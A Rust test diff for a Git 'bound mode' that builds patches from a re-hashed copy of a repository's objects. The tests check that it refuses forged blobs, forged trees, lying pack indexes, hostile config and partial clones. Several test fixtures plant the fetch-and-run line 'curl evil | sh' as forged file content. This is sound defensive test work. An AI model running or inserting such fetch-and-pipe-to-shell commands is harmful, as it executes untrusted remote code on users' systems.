@@ -1170,6 +1170,981 @@ mod child_tests {
         let out = run_child(&spec(Program::Pinned(&pinned), &[], b""));
         assert!(matches!(&out, Err(ChildFailure::Exit { .. })), "{out:?}");
     }
+
+    // ---- Bound mode (ADR 0012 D2/D3; M7-PATCH-BOUND step a) ----
+
+    #[test]
+    fn every_bound_mode_git_child_runs_under_the_memory_caps() {
+        // Lodestar's ruling on review S2: /usr/bin/prlimit sets RLIMIT_DATA and RLIMIT_AS before
+        // the admitted Git runs. The child reports its own limits through a shell alias.
+        let git = test_git();
+        let out = run_child(&ChildSpec {
+            program: super::child::bound_program(&git),
+            args: &["-c", "alias.limits=!cat /proc/self/limits", "limits"],
+            stdin: b"",
+            env: &[
+                ("HOME", "/nonexistent"),
+                ("GIT_CONFIG_NOSYSTEM", "1"),
+                ("GIT_CONFIG_GLOBAL", "/dev/null"),
+            ],
+            cwd: Path::new("/"),
+            timeout: Duration::from_secs(10),
+            stdout_cap: 64 * 1024,
+            stderr_cap: 64 * 1024,
+        })
+        .unwrap();
+        let limits = String::from_utf8(out.stdout).unwrap();
+        let row = |name: &str| {
+            limits
+                .lines()
+                .find(|l| l.starts_with(name))
+                .unwrap_or_else(|| panic!("no {name} row in {limits}"))
+                .split_whitespace()
+                .rev()
+                .nth(2)
+                .unwrap()
+                .to_owned()
+        };
+        assert_eq!(row("Max data size"), super::child::DATA_CAP.to_string());
+        assert_eq!(
+            row("Max address space"),
+            super::child::ADDRESS_SPACE_CAP.to_string()
+        );
+    }
+
+    /// A repository built by real Git in a scratch directory; `git(args)` runs in it.
+    struct Repo {
+        dir: PathBuf,
+    }
+
+    impl Repo {
+        fn new(label: &str, format: &str) -> Self {
+            let dir = scratch(label);
+            let repo = Repo { dir };
+            repo.git(&[
+                "init",
+                "-q",
+                &format!("--object-format={format}"),
+                "-b",
+                "main",
+            ]);
+            repo
+        }
+        fn git(&self, args: &[&str]) -> String {
+            let out = command("/usr/bin/git")
+                .args([
+                    "-c",
+                    "user.name=t",
+                    "-c",
+                    "user.email=t@example.invalid",
+                    "-c",
+                    "commit.gpgsign=false",
+                ])
+                .args(args)
+                .current_dir(&self.dir)
+                .env_remove("GIT_DIR")
+                .output()
+                .unwrap();
+            assert!(
+                out.status.success(),
+                "git {args:?}: {}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+            String::from_utf8(out.stdout).unwrap().trim().to_owned()
+        }
+        fn commit(&self, path: &str, text: &str) -> String {
+            let file = self.dir.join(path);
+            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
+            std::fs::write(&file, text).unwrap();
+            self.git(&["add", "--", path]);
+            self.git(&["commit", "-q", "-m", path]);
+            self.git(&["rev-parse", "HEAD"])
+        }
+        fn objects(&self) -> PathBuf {
+            super::child::admit_repository(&self.dir).unwrap()
+        }
+        /// `scripts/make_patch.sh base head` on this repository.
+        fn make_patch(&self, base: &str, head: &str) -> Vec<u8> {
+            let script =
+                PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scripts/make_patch.sh");
+            let out = command("/usr/bin/bash")
+                .arg(script)
+                .args([base, head])
+                .arg(&self.dir)
+                .output()
+                .unwrap();
+            assert!(
+                out.status.success(),
+                "make_patch: {}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+            out.stdout
+        }
+    }
+
+    /// One bound run on `repo`; it must leave nothing in its temporary base.
+    struct Ran(Result<super::child::BoundDiff, super::child::BoundFailure>);
+
+    fn bound(repo: &Repo, base: &str, head: &str) -> Ran {
+        let tmp = scratch("bound-tmp");
+        let result = super::child::bound_diff_in(
+            &test_git(),
+            &repo.objects(),
+            base,
+            head,
+            &tmp,
+            Duration::from_secs(60),
+        );
+        assert_eq!(
+            std::fs::read_dir(&tmp).unwrap().count(),
+            0,
+            "bound mode left files in its temporary base"
+        );
+        Ran(result)
+    }
+
+    #[test]
+    fn bound_mode_makes_the_patch_make_patch_makes() {
+        let repo = Repo::new("bound-linear", "sha1");
+        let root = repo.commit("a.txt", "one\n");
+        repo.commit("b.txt", "two\n");
+        let base = repo.commit("a.txt", "one\nmore\n");
+        repo.git(&["checkout", "-q", "-b", "topic", &root]);
+        repo.commit("src/x.rs", "fn x() {}\n");
+        let head = repo.commit("a.txt", "changed\n");
+        let made = bound(&repo, &base, &head).0.unwrap();
+        assert_eq!(made.merge_base, root);
+        assert_eq!(
+            String::from_utf8_lossy(&made.patch),
+            String::from_utf8_lossy(&repo.make_patch(&base, &head))
+        );
+        assert!(
+            String::from_utf8_lossy(&made.patch).contains("--- a/src/x.rs\n")
+                || String::from_utf8_lossy(&made.patch).contains("+++ b/src/x.rs\n")
+        );
+    }
+
+    #[test]
+    fn bound_mode_cuts_at_the_copy_edge_when_head_reaches_older_history_through_a_merge() {
+        // The shape forge-warden's own history has (Q-C record): head merges a branch that starts
+        // below the merge base, so `shallow` = the merge base alone walks into an uncopied commit.
+        let repo = Repo::new("bound-merge", "sha1");
+        let a = repo.commit("a.txt", "a\n");
+        let base = repo.commit("b.txt", "b\n");
+        repo.git(&["checkout", "-q", "-b", "side", &a]);
+        repo.commit("side.txt", "side\n");
+        repo.git(&["checkout", "-q", "-b", "topic", &base]);
+        repo.git(&["merge", "-q", "--no-edit", "side"]);
+        let head = repo.commit("c.txt", "c\n");
+        let made = bound(&repo, &base, &head).0.unwrap();
+        assert_eq!(made.merge_base, base);
+        assert_eq!(made.patch, repo.make_patch(&base, &head));
+    }
+
+    #[test]
+    fn bound_mode_refuses_several_merge_bases_and_no_common_history() {
+        let repo = Repo::new("bound-criss-cross", "sha1");
+        let root = repo.commit("a.txt", "0\n");
+        repo.git(&["checkout", "-q", "-b", "x", &root]);
+        let x = repo.commit("x.txt", "x\n");
+        repo.git(&["checkout", "-q", "-b", "y", &root]);
+        let y = repo.commit("y.txt", "y\n");
+        repo.git(&["checkout", "-q", "-b", "m1", &x]);
+        repo.git(&["merge", "-q", "--no-edit", &y]);
+        let m1 = repo.git(&["rev-parse", "HEAD"]);
+        repo.git(&["checkout", "-q", "-b", "m2", &y]);
+        repo.git(&["merge", "-q", "--no-edit", &x]);
+        let m2 = repo.git(&["rev-parse", "HEAD"]);
+        assert_eq!(
+            bound(&repo, &m1, &m2).0,
+            Err(super::child::BoundFailure::SeveralMergeBases(2))
+        );
+        repo.git(&["checkout", "-q", "--orphan", "other"]);
+        let other = repo.commit("o.txt", "o\n");
+        assert_eq!(
+            bound(&repo, &m1, &other).0,
+            Err(super::child::BoundFailure::NoCommonHistory)
+        );
+    }
+
+    #[test]
+    fn bound_mode_takes_only_full_commit_ids() {
+        let repo = Repo::new("bound-ids", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        let blob = repo.git(&["rev-parse", "HEAD:a.txt"]);
+        let (short, long, upper) = (
+            base.get(..12).unwrap().to_owned(),
+            format!("{head}{}", "0".repeat(24)),
+            base.to_uppercase(),
+        );
+        let truncated = head.get(..39).unwrap().to_owned();
+        for (b, h) in [
+            (short.as_str(), head.as_str()),
+            (base.as_str(), truncated.as_str()),
+            (base.as_str(), long.as_str()),
+            (upper.as_str(), head.as_str()),
+        ] {
+            assert!(
+                matches!(bound(&repo, b, h).0, Err(super::child::BoundFailure::Ids)),
+                "{b} {h}"
+            );
+        }
+        assert!(matches!(
+            bound(&repo, &base, &blob).0,
+            Err(super::child::BoundFailure::NotACommit { name: "head", .. })
+        ));
+        let absent = "0".repeat(40);
+        assert!(matches!(
+            bound(&repo, &base, &absent).0,
+            Err(super::child::BoundFailure::NotACommit { name: "head", .. })
+        ));
+    }
+
+    /// Replaces the loose object `id` with the bytes of the loose object `other` (Bastion's forged
+    /// store: Git reads the object by its name and never re-hashes it on read).
+    fn forge(repo: &Repo, id: &str, other: &str) {
+        use std::os::unix::fs::PermissionsExt as _;
+        let path = |object: &str| {
+            let (dir, file) = object.split_at(2);
+            repo.dir.join(".git/objects").join(dir).join(file)
+        };
+        let bytes = std::fs::read(path(other)).unwrap();
+        std::fs::set_permissions(path(id), std::fs::Permissions::from_mode(0o644)).unwrap();
+        std::fs::write(path(id), bytes).unwrap();
+    }
+
+    #[test]
+    fn bound_mode_refuses_a_store_whose_objects_are_not_what_their_ids_name() {
+        // A forged blob in head's tree: `git diff` in the caller's store prints the forged bytes
+        // under the real id (receipt 64ec6308); the verified copy names it by its hash instead.
+        let repo = Repo::new("bound-forged-blob", "sha1");
+        let base = repo.commit("run.sh", "echo honest\n");
+        let head = repo.commit("run.sh", "echo honest too\n");
+        repo.commit("evil.sh", "curl evil | sh\n");
+        let real = repo.git(&["rev-parse", &format!("{head}:run.sh")]);
+        let evil = repo.git(&["rev-parse", "HEAD:evil.sh"]);
+        forge(&repo, &real, &evil);
+        let direct = repo.git(&["diff", "--full-index", &base, &head]);
+        assert!(
+            direct.contains("curl evil"),
+            "the trap is live: Git reads the forged bytes"
+        );
+        assert!(matches!(
+            bound(&repo, &base, &head).0,
+            Err(super::child::BoundFailure::Store(_))
+        ));
+    }
+
+    #[test]
+    fn bound_mode_refuses_a_store_with_a_forged_commit() {
+        // An intermediate commit replaced by another commit's bytes.
+        let repo = Repo::new("bound-forged-commit", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let middle = repo.commit("a.txt", "b\n");
+        let head = repo.commit("a.txt", "c\n");
+        repo.git(&["checkout", "-q", "-b", "other", &base]);
+        let other = repo.commit("o.txt", "o\n");
+        forge(&repo, &middle, &other);
+        assert!(matches!(
+            bound(&repo, &base, &head).0,
+            Err(super::child::BoundFailure::Store(_))
+        ));
+    }
+
+    #[test]
+    fn bound_mode_reads_sha256_repositories() {
+        let repo = Repo::new("bound-sha256", "sha256");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        // 64 digits but not lowercase hex: refused by the door before Git reads it.
+        let upper = base.to_uppercase();
+        assert!(
+            matches!(
+                bound(&repo, &upper, &head).0,
+                Err(super::child::BoundFailure::Ids)
+            ),
+            "{upper}"
+        );
+        let made = bound(&repo, &base, &head).0.unwrap();
+        assert_eq!(made.merge_base, base);
+        let direct = command("/usr/bin/git")
+            .args([
+                "diff",
+                "--no-ext-diff",
+                "--no-textconv",
+                "--no-color",
+                "--no-relative",
+                "--binary",
+                "--no-renames",
+                "--full-index",
+                "--src-prefix=a/",
+                "--dst-prefix=b/",
+                &base,
+                &head,
+            ])
+            .current_dir(&repo.dir)
+            .output()
+            .unwrap();
+        assert_eq!(made.patch, direct.stdout);
+    }
+
+    #[test]
+    fn bound_mode_keeps_a_redundant_merges_in_copy_edge() {
+        // Bastion, verify of 148513ea (Must 1): head's line has a merge whose second parent is an
+        // ancestor of mb (outside the copy). Shallowing that copied merge dropped its in-copy edge
+        // too, and an honest store was refused with "no common history". Now the outside parent's
+        // commit object is copied and shallowed instead.
+        let repo = Repo::new("bound-redundant", "sha1");
+        repo.commit("r.txt", "r\n");
+        let m1 = repo.commit("a.txt", "1\n");
+        let mb = repo.commit("a.txt", "mb\n");
+        repo.git(&["checkout", "-q", "-b", "side", &mb]);
+        let a1 = repo.commit("s.txt", "a1\n");
+        let x = repo.git(&[
+            "commit-tree",
+            "-p",
+            &a1,
+            "-p",
+            &m1,
+            "-m",
+            "redundant",
+            &format!("{a1}^{{tree}}"),
+        ]);
+        repo.git(&["reset", "-q", "--hard", &x]);
+        let head = repo.commit("s.txt", "h1\n");
+        repo.git(&["checkout", "-q", "main"]);
+        let base = repo.commit("b.txt", "b\n");
+        assert_eq!(repo.git(&["merge-base", "--all", &base, &head]), mb);
+        let made = bound(&repo, &base, &head).0.unwrap();
+        assert_eq!(made.merge_base, mb);
+        assert_eq!(made.patch, repo.make_patch(&base, &head));
+    }
+
+    #[test]
+    fn bound_mode_refuses_when_both_sides_reach_one_old_commit_past_the_boundary() {
+        // A known limit (ADR 0012 D3.3 correction): base's and head's lines both merge the same commit
+        // `old` from below mb's parent. In verified, mb's parent is a shallow boundary, so verified
+        // cannot see that `old` is below mb and gives two merge bases. The run is refused (exit 3);
+        // a wrong merge base is never used. When `old` is mb's own parent, verified keeps mb's edge
+        // to it and the run passes (the second case).
+        for gap in [true, false] {
+            let repo = Repo::new("bound-redundant-both", "sha1");
+            repo.commit("r.txt", "r\n");
+            let old = repo.commit("a.txt", "1\n");
+            if gap {
+                repo.commit("a.txt", "2\n");
+            }
+            let mb = repo.commit("a.txt", "mb\n");
+            let merge_old = |name: &str| {
+                repo.git(&["checkout", "-q", "-b", name, &mb]);
+                let tip = repo.commit(&format!("{name}.txt"), "x\n");
+                let m = repo.git(&[
+                    "commit-tree",
+                    "-p",
+                    &tip,
+                    "-p",
+                    &old,
+                    "-m",
+                    "redundant",
+                    &format!("{tip}^{{tree}}"),
+                ]);
+                repo.git(&["reset", "-q", "--hard", &m]);
+                repo.commit(&format!("{name}.txt"), "y\n")
+            };
+            let base = merge_old("left");
+            let head = merge_old("right");
+            assert_eq!(repo.git(&["merge-base", "--all", &base, &head]), mb);
+            let ran = bound(&repo, &base, &head).0;
+            if gap {
+                assert!(
+                    matches!(&ran, Err(super::child::BoundFailure::VerifiedMergeBase(why)) if why.contains("verified copy gives no single merge base") && why.contains("2 merge bases")),
+                    "{ran:?}"
+                );
+            } else {
+                let made = ran.unwrap();
+                assert_eq!(made.merge_base, mb);
+                assert_eq!(made.patch, repo.make_patch(&base, &head));
+            }
+        }
+    }
+
+    #[test]
+    fn bound_mode_refuses_a_forged_tree() {
+        // Bastion's row (ADR 0012 acceptance item 2): head's root tree replaced by another tree's bytes.
+        let repo = Repo::new("bound-forged-tree", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("run.sh", "echo honest\n");
+        repo.git(&["checkout", "-q", "-b", "o", &base]);
+        let other = repo.commit("run.sh", "curl evil | sh\n");
+        let tree = repo.git(&["rev-parse", &format!("{head}^{{tree}}")]);
+        let evil_tree = repo.git(&["rev-parse", &format!("{other}^{{tree}}")]);
+        forge(&repo, &tree, &evil_tree);
+        assert!(
+            repo.git(&["diff", "--full-index", &base, &head])
+                .contains("curl evil"),
+            "the trap is live"
+        );
+        assert!(matches!(
+            bound(&repo, &base, &head).0,
+            Err(super::child::BoundFailure::Store(_))
+        ));
+    }
+
+    #[test]
+    fn bound_mode_refuses_a_lying_pack_index() {
+        // Bastion's row (item 2): a pack whose .idx maps head's blob id to another blob's offset.
+        let repo = Repo::new("bound-lying-idx", "sha1");
+        let base = repo.commit("run.sh", "echo honest\n");
+        let head = repo.commit("run.sh", "echo honest too\n");
+        repo.commit("evil.sh", "curl evil | sh\n");
+        let real = repo.git(&["rev-parse", &format!("{head}:run.sh")]);
+        let evil = repo.git(&["rev-parse", "HEAD:evil.sh"]);
+        repo.git(&["repack", "-a", "-d", "-q"]);
+        let idx = std::fs::read_dir(repo.dir.join(".git/objects/pack"))
+            .unwrap()
+            .map(|e| e.unwrap().path())
+            .find(|p| p.extension().is_some_and(|x| x == "idx"))
+            .unwrap();
+        let mut bytes = std::fs::read(&idx).unwrap();
+        // idx v2: 8-byte header, 256 fan-out words, N names (20 bytes), N CRC-32s, N offsets (4).
+        let word = |at: usize| -> [u8; 4] { bytes.get(at..at + 4).unwrap().try_into().unwrap() };
+        let n = usize::try_from(u32::from_be_bytes(word(8 + 255 * 4))).unwrap();
+        let names = 8 + 256 * 4;
+        let position = |id: &str| {
+            let want: Vec<u8> = (0..20)
+                .map(|i| u8::from_str_radix(id.get(2 * i..2 * i + 2).unwrap(), 16).unwrap())
+                .collect();
+            (0..n)
+                .find(|i| {
+                    bytes.get(names + 20 * i..names + 20 * i + 20).unwrap() == want.as_slice()
+                })
+                .unwrap()
+        };
+        let offsets = names + 24 * n;
+        let (r, e) = (offsets + 4 * position(&real), offsets + 4 * position(&evil));
+        let evil_offset = word(e);
+        bytes
+            .get_mut(r..r + 4)
+            .unwrap()
+            .copy_from_slice(&evil_offset);
+        {
+            use std::os::unix::fs::PermissionsExt as _;
+            std::fs::set_permissions(&idx, std::fs::Permissions::from_mode(0o644)).unwrap();
+        }
+        std::fs::write(&idx, bytes).unwrap();
+        assert!(
+            repo.git(&["cat-file", "-p", &real]).contains("curl evil"),
+            "the trap is live: plain Git reads the other blob"
+        );
+        assert!(matches!(
+            bound(&repo, &base, &head).0,
+            Err(super::child::BoundFailure::Store(_))
+        ));
+    }
+
+    #[test]
+    fn bound_mode_reads_no_commit_graph_or_multi_pack_index() {
+        // Bastion's row (item 2): garbage in both is not read; the honest diff is made.
+        let repo = Repo::new("bound-graph-midx", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("b.txt", "b\n");
+        repo.git(&["repack", "-a", "-d", "-q"]);
+        repo.git(&["commit-graph", "write", "--reachable"]);
+        repo.git(&["multi-pack-index", "write"]);
+        for f in [
+            repo.dir.join(".git/objects/info/commit-graph"),
+            repo.dir.join(".git/objects/pack/multi-pack-index"),
+        ] {
+            use std::os::unix::fs::PermissionsExt as _;
+            let mut b = std::fs::read(&f).unwrap();
+            let end = b.len() - 20;
+            for x in b.get_mut(64..end).unwrap() {
+                *x ^= 0x5a;
+            }
+            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o644)).unwrap();
+            std::fs::write(&f, b).unwrap();
+        }
+        let made = bound(&repo, &base, &head).0.unwrap();
+        assert_eq!(made.patch, repo.make_patch(&base, &head));
+    }
+
+    #[test]
+    fn bound_mode_edge_ids_and_a_gitlink() {
+        // Bastion's rows: base = head is an empty diff; a tag or tree id is not a commit; a gitlink
+        // in head gives make_patch's bytes.
+        let repo = Repo::new("bound-edges", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        let same = bound(&repo, &head, &head).0.unwrap();
+        assert_eq!(same.patch, Vec::<u8>::new());
+        assert_eq!(same.patch, repo.make_patch(&head, &head));
+        repo.git(&["tag", "-a", "-m", "t", "t1", &head]);
+        let tag = repo.git(&["rev-parse", "t1"]);
+        let tree = repo.git(&["rev-parse", &format!("{base}^{{tree}}")]);
+        for (b, h) in [
+            (base.as_str(), tag.as_str()),
+            (tree.as_str(), head.as_str()),
+        ] {
+            assert!(
+                matches!(
+                    bound(&repo, b, h).0,
+                    Err(super::child::BoundFailure::NotACommit { .. })
+                ),
+                "{b} {h}"
+            );
+        }
+        repo.git(&[
+            "update-index",
+            "--add",
+            "--cacheinfo",
+            &format!("160000,{base},vendor/sub"),
+        ]);
+        repo.git(&["commit", "-q", "-m", "gitlink"]);
+        let with_link = repo.git(&["rev-parse", "HEAD"]);
+        let made = bound(&repo, &head, &with_link).0.unwrap();
+        assert_eq!(made.patch, repo.make_patch(&head, &with_link));
+    }
+
+    #[test]
+    fn bound_mode_ignores_hostile_caller_settings() {
+        // Bastion's row (item 4): the caller's config, attributes, grafts and replace refs.
+        let repo = Repo::new("bound-hostile", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        repo.commit("dir/x.txt", "x\n");
+        repo.commit("bin.dat", "\0\x01binary\n");
+        repo.commit("caf\u{e9} file.txt", "accented name\n");
+        repo.commit(".gitattributes", "*.txt -diff\n*.dat diff=evil\n");
+        let head = repo.commit("a.txt", "a2\n");
+        let clean = bound(&repo, &base, &head).0.unwrap();
+        for (k, v) in [
+            ("diff.noprefix", "true"),
+            ("diff.relative", "true"),
+            ("diff.mnemonicPrefix", "true"),
+            ("diff.external", "/bin/false"),
+            ("diff.renames", "copies"),
+            ("diff.evil.textconv", "/bin/false"),
+            ("diff.algorithm", "patience"),
+            ("diff.context", "9"),
+            ("core.quotePath", "false"),
+            ("color.diff", "always"),
+            ("core.attributesFile", "/dev/null"),
+        ] {
+            repo.git(&["config", k, v]);
+        }
+        std::fs::create_dir_all(repo.dir.join(".git/info")).unwrap();
+        std::fs::write(repo.dir.join(".git/info/attributes"), "* -diff\n").unwrap();
+        std::fs::write(repo.dir.join(".git/info/grafts"), format!("{head}\n")).unwrap();
+        let other = repo.git(&[
+            "commit-tree",
+            "-p",
+            &base,
+            "-m",
+            "replacement",
+            &format!("{base}^{{tree}}"),
+        ]);
+        repo.git(&["replace", &head, &other]);
+        assert_eq!(bound(&repo, &base, &head).0.unwrap(), clean);
+        assert_eq!(clean.patch, repo.make_patch(&base, &head));
+    }
+
+    #[test]
+    fn bound_mode_refuses_a_partial_clone_without_fetching() {
+        // Bastion's row (item 5): a blob:none clone misses head's blob; staging has no promisor, and
+        // the origin is moved away so a fetch could not succeed even if one were tried.
+        let origin = Repo::new("bound-promisor-origin", "sha1");
+        let base = origin.commit("a.txt", "a\n");
+        let head = origin.commit("a.txt", "b\n");
+        origin.git(&["config", "uploadpack.allowFilter", "true"]);
+        let dst = scratch("bound-partial");
+        std::fs::remove_dir(&dst).unwrap();
+        let out = command("/usr/bin/git")
+            .args(["clone", "-q", "--no-checkout", "--filter=blob:none"])
+            .arg(format!("file://{}", origin.dir.display()))
+            .arg(&dst)
+            .output()
+            .unwrap();
+        assert!(
+            out.status.success(),
+            "{}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+        let partial = Repo { dir: dst };
+        std::fs::rename(&origin.dir, origin.dir.with_extension("gone")).unwrap();
+        assert!(matches!(
+            bound(&partial, &base, &head).0,
+            Err(super::child::BoundFailure::Store(_))
+        ));
+    }
+
+    #[test]
+    fn bound_mode_stops_at_its_deadline_and_leaves_nothing() {
+        // ADR 0012 acceptance items 3 (time limit) and 6 (cleanup after a timeout, where the door
+        // kills the Git it ran). Budgets from none to a few tens of milliseconds stop the run at
+        // different steps; each result is make_patch's bytes or the time limit, never anything
+        // else, and nothing is left in the temporary base. The zero budget always times out.
+        let repo = Repo::new("bound-deadline", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        let expected = repo.make_patch(&base, &head);
+        let mut timeouts = 0;
+        for millis in [0, 5, 20, 50] {
+            let tmp = scratch("bound-tmp-deadline");
+            let ran = super::child::bound_diff_in(
+                &test_git(),
+                &repo.objects(),
+                &base,
+                &head,
+                &tmp,
+                Duration::from_millis(millis),
+            );
+            match &ran {
+                Ok(made) => assert_eq!(made.patch, expected, "{millis} ms"),
+                Err(super::child::BoundFailure::Unavailable(why)) if why.contains("time limit") => {
+                    timeouts += 1;
+                }
+                Err(other) => panic!("{millis} ms: {other:?}"),
+            }
+            assert_eq!(
+                std::fs::read_dir(&tmp).unwrap().count(),
+                0,
+                "{millis} ms: bound mode left files in its temporary base"
+            );
+        }
+        assert!(timeouts >= 1, "the zero budget times out");
+    }
+
+    #[test]
+    fn the_recheck_refuses_a_merge_base_the_verified_objects_do_not_give() {
+        // ADR 0012 D3 step 4 and acceptance item 8 ("merge base taken from staging without the
+        // recheck"): the true merge base passes; any other id is refused as a store problem.
+        let repo = Repo::new("bound-recheck", "sha1");
+        let root = repo.commit("a.txt", "0\n");
+        let base = repo.commit("a.txt", "1\n");
+        repo.git(&["checkout", "-q", "-b", "side", &root]);
+        let head = repo.commit("b.txt", "2\n");
+        let git_dir = repo.dir.join(".git");
+        let tmp = scratch("bound-tmp-recheck");
+        assert_eq!(
+            super::child::recheck_in(&test_git(), &git_dir, &root, &base, &head, &tmp),
+            Ok(())
+        );
+        for wrong in [&base, &head] {
+            assert!(
+                matches!(
+                    super::child::recheck_in(&test_git(), &git_dir, wrong, &base, &head, &tmp),
+                    Err(super::child::BoundFailure::VerifiedMergeBase(why)) if why.contains("is not the one its re-hashed objects give")
+                ),
+                "{wrong}"
+            );
+        }
+    }
+
+    #[test]
+    fn bound_mode_equals_make_patch_on_twenty_generated_pairs_in_both_object_formats() {
+        // ADR 0012 acceptance item 1 (ruling P1.3): byte equality on 20 named pairs of one generated
+        // history, in a SHA-1 and a SHA-256 store. The history has every change shape make_patch.sh
+        // writes: modify, add, non-ASCII name, binary, executable bit, symlink, delete, rename (as
+        // delete and add: --no-renames), empty file, no final newline, a side branch and a merge.
+        for format in ["sha1", "sha256"] {
+            let repo = Repo::new(&format!("bound-pairs-{format}"), format);
+            let commit = |message: &str| {
+                repo.git(&["commit", "-q", "--allow-empty", "-m", message]);
+                repo.git(&["rev-parse", "HEAD"])
+            };
+            let mut main = vec![repo.commit("a.txt", "one\ntwo\nthree\n")];
+            main.push(repo.commit("dir/b.txt", "b\n"));
+            main.push(repo.commit("caf\u{e9} \u{1f600}.txt", "accented\n"));
+            main.push(repo.commit("bin.dat", "\0\x01\x02 binary \u{fffd}\n"));
+            main.push(repo.commit("run.sh", "#!/bin/sh\necho run\n"));
+            {
+                use std::os::unix::fs::PermissionsExt as _;
+                std::fs::set_permissions(
+                    repo.dir.join("run.sh"),
+                    std::fs::Permissions::from_mode(0o755),
+                )
+                .unwrap();
+            }
+            repo.git(&["add", "run.sh"]);
+            main.push(commit("executable"));
+            std::os::unix::fs::symlink("a.txt", repo.dir.join("link")).unwrap();
+            repo.git(&["add", "link"]);
+            main.push(commit("symlink"));
+            repo.git(&["checkout", "-q", "-b", "side", main.get(3).unwrap()]);
+            let side_a = repo.commit("side.txt", "side\n");
+            let side_b = repo.commit("bin.dat", "\0\x03 other binary\n");
+            repo.git(&["checkout", "-q", "main"]);
+            repo.git(&["rm", "-q", "dir/b.txt"]);
+            main.push(commit("delete"));
+            repo.git(&["mv", "a.txt", "renamed.txt"]);
+            main.push(commit("rename"));
+            main.push(repo.commit("empty.txt", ""));
+            main.push(repo.commit("tail.txt", "no final newline"));
+            repo.git(&["merge", "-q", "--no-edit", "side"]);
+            main.push(repo.git(&["rev-parse", "HEAD"]));
+            main.push(repo.commit("renamed.txt", "one\n2\nthree\nfour\n"));
+            let m = |i: usize| main.get(i).unwrap().as_str();
+            let pairs = [
+                (m(0), m(1)),
+                (m(1), m(2)),
+                (m(2), m(3)),
+                (m(3), m(4)),
+                (m(4), m(5)),
+                (m(5), m(6)),
+                (m(6), m(7)),
+                (m(7), m(8)),
+                (m(8), m(9)),
+                (m(9), m(10)),
+                (m(10), m(11)),
+                (m(11), m(12)),
+                (m(0), m(12)),
+                (m(2), m(9)),
+                (m(6), m(11)),
+                (side_b.as_str(), m(12)),
+                (m(9), side_b.as_str()),
+                (side_a.as_str(), m(8)),
+                (m(12), side_a.as_str()),
+                (m(12), m(12)),
+            ];
+            assert_eq!(pairs.len(), 20);
+            for (base, head) in pairs {
+                let made = bound(&repo, base, head)
+                    .0
+                    .unwrap_or_else(|e| panic!("{format} {base} {head}: {e:?}"));
+                assert_eq!(
+                    made.merge_base,
+                    repo.git(&["merge-base", base, head]),
+                    "{format} {base} {head}"
+                );
+                assert_eq!(
+                    made.patch,
+                    repo.make_patch(base, head),
+                    "{format} {base} {head}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    #[ignore = "reads this repository's own history, which needs a plain clone (a worktree's .git is a file, refused by design); the PATCH-BOUND gate runs it with --ignored in its fresh clone"]
+    fn bound_mode_equals_make_patch_on_this_repositorys_history() {
+        // ADR 0012 acceptance item 1 (ruling P1.3): byte equality on real pairs of forge-warden's own
+        // history: the last 20 first-parent steps, and the last 5 merges against their second parent.
+        let repo = Repo {
+            dir: PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../.."),
+        };
+        let line = repo.git(&["rev-list", "--first-parent", "-n", "21", "HEAD"]);
+        let firsts: Vec<&str> = line.lines().collect();
+        assert_eq!(firsts.len(), 21, "a clone with history");
+        let mut pairs: Vec<(String, String)> = firsts
+            .windows(2)
+            .map(|w| {
+                (
+                    (*w.get(1).unwrap()).to_owned(),
+                    (*w.first().unwrap()).to_owned(),
+                )
+            })
+            .collect();
+        let merges = repo.git(&["rev-list", "--merges", "-n", "5", "HEAD"]);
+        for merge in merges.lines() {
+            // The merged branch's tip against the merge (the merge base is that tip).
+            let second = repo.git(&["rev-parse", &format!("{merge}^2")]);
+            pairs.push((second, merge.to_owned()));
+        }
+        assert!(pairs.len() >= 20);
+        for (base, head) in &pairs {
+            let made = bound(&repo, base, head)
+                .0
+                .unwrap_or_else(|e| panic!("{base} {head}: {e:?}"));
+            assert_eq!(made.patch, repo.make_patch(base, head), "{base} {head}");
+        }
+    }
+
+    #[test]
+    fn each_bound_mode_refusal_says_what_it_is() {
+        // The messages users read for each variant (REFUSAL_MAP rows match the variant; this holds
+        // the words).
+        use super::child::{BoundFailure as B, RepositoryRefusal as R};
+        for (failure, text) in [
+            (
+                B::Ids,
+                "--base and --head must be full object ids of one length (40 or 64 lowercase hex digits)",
+            ),
+            (
+                B::NotACommit {
+                    name: "base",
+                    id: "abc".to_owned(),
+                },
+                "base abc is not a commit in the repository",
+            ),
+            (B::NoCommonHistory, "base and head have no common history"),
+            (
+                B::SeveralMergeBases(3),
+                "base and head have 3 merge bases; name the merge base as --base",
+            ),
+            (B::Store("s".to_owned()), "s"),
+            (B::VerifiedMergeBase("v".to_owned()), "v"),
+            (B::Unavailable("u".to_owned()), "u"),
+            (
+                B::Repository(R::Shallow),
+                "--repo: it is a shallow repository: its history is incomplete",
+            ),
+            (B::Door(super::DoorError::environment("d".to_owned())), "d"),
+        ] {
+            assert_eq!(failure.to_string(), text);
+        }
+    }
+
+    #[test]
+    fn bound_mode_names_a_setup_failure_as_a_door_failure() {
+        // REFUSAL-MAP row BoundFailure::Door: the private directory cannot be made under a relative
+        // temporary base (the isolation door refuses it), before any Git runs.
+        let repo = Repo::new("bound-door", "sha1");
+        let base = repo.commit("a.txt", "a\n");
+        let head = repo.commit("a.txt", "b\n");
+        let ran = super::child::bound_diff_in(
+            &test_git(),
+            &repo.objects(),
+            &base,
+            &head,
+            Path::new("relative/base"),
+            Duration::from_secs(60),
+        );
+        assert!(
+            matches!(&ran, Err(super::child::BoundFailure::Door(e)) if e.kind == super::DoorErrorKind::Environment),
+            "{ran:?}"
+        );
+    }
+
+    #[test]
